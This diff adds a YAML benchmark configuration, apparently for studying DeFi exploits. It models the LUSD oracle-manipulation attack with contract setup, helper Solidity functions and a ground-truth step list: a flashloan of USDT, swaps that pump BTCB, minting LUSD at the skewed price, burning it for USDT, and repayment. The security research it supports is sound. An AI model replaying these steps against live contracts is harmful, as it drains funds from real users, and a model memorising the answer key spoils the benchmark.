@@ -1,0 +1,94 @@
+# Information for benchmarks building.
+project_name: "LUSD"
+
+ctrt_name2cls:
+  - ["lusd", "LUSD"]
+  - ["usdt", "USDT"]
+  - ["btcb", "BTCB"]
+  - ["pairub", "UniswapV2Pair"]
+  - ["loan", "Loan"]
+  - ["lusdpool", "LUSDPool"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["lusd", "new LUSD(owner)"]
+  - ["usdt", ""]
+  - ["btcb", "new BTCB()"]
+  - ["pairub", ""]
+  - ["loan", "new Loan(owner)"]
+  - ["lusdpool", "new LUSDPool(owner)"]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions:
+  - "function swap_loan_attacker_btcb_lusd(uint256 amount, uint256 amountOut) internal eurus {
+    btcb.approve(address(loan), type(uint256).max);
+    loan.supply(address(btcb), amount);
+  }"
+  - "function burn_lusd_lusdpool(uint256 amount) internal eurus {
+    lusd.approve(address(lusdpool), type(uint256).max);
+    lusdpool.withdraw(amount);
+  }"
+
+extra_deployments: 
+  - "loan.afterDeploy(address(usdt), address(router));
+    lusdpool.afterDeploy(address(usdt), address(router));
+    loan.setAddrs(address(lusd));
+    lusdpool.setAddrs(address(lusd));
+    loan.setInfo(address(btcb), address(lusd), 1, 5000, 1);
+    "
+
+extra_statements: []
+
+attack_goal_str: "usdt;8000"
+
+groundtruth:
+  - ["borrow", "usdt", "owner", "980925 * 1e18"]
+  - ["swap", "pairub", "attacker", "usdt", "btcb", "usdt.balanceOf(attacker) * 5/6", "1246953598313175025"]
+  - ["swap", "loan", "attacker", "btcb", "lusd", "1515366635982742", "10000 * 1e18"]
+  - ["burn", "lusd", "lusdpool", "lusd.balanceOf(attacker)"]
+  - ["swap", "pairub", "attacker", "btcb", "usdt", "btcb.balanceOf(attacker)", "pairub.getAmountOut(btcb.balanceOf(attacker), address(btcb))"]
+  - ["payback", "usdt", "owner", "980925 * 1e18"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "lusd":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "btcb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pairub":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["usdt", "btcb"]
+    support_swaps:
+      "usdt": ["usdt", "btcb"]
+      "btcb": ["usdt", "btcb"]
+    is_oracle: true
+    oracle: "pairub"
+  "loan":
+    is_swappair: true
+    token_pair: ["btcb", "lusd"]
+    support_swaps:
+      "btcb": ["btcb", "lusd"]
+      "lusd": ["btcb", "lusd"]
+    is_oracle: true
+    oracle: "loan"
+  "lusdpool":
+    is_swappair: true
+    token_pair: ["lusd", "usdt"]
+    support_swaps:
+      "lusd": ["lusd", "usdt"]
+      "usdt": ["lusd", "usdt"]
+    is_oracle: true
+    oracle: "lusdpool"
+  
+pattern: "Pump & Dump"
